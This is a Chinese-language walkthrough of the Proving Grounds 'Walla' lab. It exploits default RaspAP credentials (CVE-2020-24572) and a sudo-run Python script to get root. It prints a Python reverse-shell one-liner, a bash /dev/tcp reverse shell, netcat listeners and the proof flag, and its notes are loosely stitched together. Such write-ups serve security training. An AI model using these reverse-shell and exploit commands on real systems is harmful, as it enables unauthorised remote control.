参考资料：  
[https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Walla.md](https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Walla.md)
   

关于本实验室  
要控制此实验环境，您将利用 RaspAP Web 应用程序中已启用的 Web 控制台，并使用默认身份验证凭据。然后，您将通过利用 Python 模块导入顺序来提升权限，该脚本可以使用 sudo 权限执行。此实验将加深您对 Web 应用程序漏洞和 Python 权限提升技术的理解。
      

本实验演示如何利用 RaspAP Web 应用程序中的默认凭据，通过其 Web 控制台实现远程代码执行。学员将通过利用 Python 模块导入顺序，以 root 用户身份执行恶意载荷，从而提升权限。该脚本由 sudo 授权。本实验重点讲解 Web 应用程序配置错误以及 Python 中各种巧妙的权限提升技巧。
    
枚举打开的服务，以识别目标上运行的 RaspAP 应用程序。  
使用默认凭据登录 Web 控制台并执行代码。  
部署反向 shell 有效载荷并以 www-data 身份建立连接。  
分析启用 sudo 的 Python 脚本，寻找权限提升的机会。  
创建一个恶意 Python 模块来劫持脚本并将权限提升到 root。
       
192.168.161.97
 
reserver  
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.227",23));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
 
┌──(kali㉿kali)-[~/pgplay]  
└─$ rlwrap -cAr nc -nvlp23
 
www-data@walla:/home/walter$ wget 192.168.45.227/wifi_reset.py  
www-data@walla:/home/walter$ sudo /usr/bin/python /home/walter/wifi_reset.py
   

echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.168",23));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")" \>\>wifi_reset.py_1
   

┌──(kali㉿kali)-[~/Desktop/pg03/Walla/CVE-2020-24572-POC]  
└─$ python3 exploit.py 192.168.161.97 8091 192.168.45.168 25 secret 2  
[!] Using Reverse Shell: /bin/bash -c 'bash -i \>& /dev/tcp/192.168.45.168/25 0\>&1'  
[!] Sending activation request - Make sure your listener is running . . .  
[\>\>\>] Press ENTER to continue . . .
 
[!] You should have a shell :)
 
[!] Remember to check sudo -l to see if you can get root through /etc/raspap/lighttpd/configport.sh  
[*] Done.   ┌──(kali㉿kali)-[~/Desktop/pg03/Walla/CVE-2020-24572-POC]  
└─$ python3 exploit.py 192.168.161.97 8091 192.168.45.168 25 secret 2  
[!] Using Reverse Shell: /bin/bash -c 'bash -i \>& /dev/tcp/192.168.45.168/25 0\>&1'  
[!] Sending activation request - Make sure your listener is running . . .  
[\>\>\>] Press ENTER to continue . . .
 
[!] You should have a shell :)
 
[!] Remember to check sudo -l to see if you can get root through /etc/raspap/lighttpd/configport.sh  
┌──(kali㉿kali)-[~]  
└─$ rlwrap -cAr nc -nvlp25  
listening on [any] 25 ...  
connect to [192.168.45.168] from (UNKNOWN) [192.168.161.97] 53618  
bash: cannot set terminal process group (658): Inappropriate ioctl for device  
bash: no job control in this shell  
www-data@walla:/var/www/html/includes$ cd /home  
cd /home  
www-data@walla:/home$ ls
       
┌──(kali㉿kali)-[~]  
└─$ rlwrap -cAr nc -nvlp23  
listening on [any] 23 ...  
connect to [192.168.45.168] from (UNKNOWN) [192.168.161.97] 33042  
# whoami  
whoami  
root  
# cd /root  
cd /root  
# ls  
ls  
proof.txt  
# cat proof.txt  
cat proof.txt  
f4dbd6c01d70be4d8e62711a1336957f  
#